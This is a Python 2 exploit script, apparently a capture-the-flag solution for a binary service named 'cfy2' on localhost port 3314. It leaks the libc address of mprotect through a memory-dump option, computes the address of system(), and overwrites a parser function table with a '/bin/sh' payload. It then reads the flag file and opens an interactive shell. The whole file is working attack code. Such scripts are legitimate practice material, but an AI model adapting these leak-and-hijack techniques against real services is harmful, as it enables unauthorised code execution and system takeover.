import struct
import socket
import time
import telnetlib

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1);buf += c
        if delim in buf:
            break
    return buf


def dump_mem(s, address_to_dump):
    s.send('2\n');recv_until(s, 'Please enter your number: ');data = struct.pack('<Q', address_to_dump);s.send(data+'\n');


def pq(v):
    return struct.pack('<Q', v)

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

s=socket.create_connection(("127.0.0.1", 3314))
mprotect_address = 0x602280
real_ = 0x070+228*0x1000
mprotect_ = 0x070
input_address = 0x602360
parser_address = 0x6022c0
system_delta = 0x004215F

dump_mem(s, mprotect_address)  # 0x7faf92f8b070L
recv_data = recv_until(s,'\n')
temp_address = int(recv_data[5:])
print '[+] ' + str(hex(temp_address))

base_libc = temp_address-mprotect_-228*0x1000
system_address = base_libc + system_delta
bin_sh_string = '/bin/sh\x00'
data2 = bin_sh_string + 'a'*(0x10-len(bin_sh_string)) + pq(system_address)*4+pq(0x602360+0x18)*0x20
recv_until(s, '3) quit\n')
index1 = (input_address - parser_address + 0x40)/0x10
s.send(str(index1)+'\n')
print recv_until(s, 'Please enter your number: ')
s.send(data2+'\n')
time.sleep(0.01)

#s.send('id\n')
s.send('cat /home/cfy2/flag\n')
print s.recv(1024)

final_interact(s)

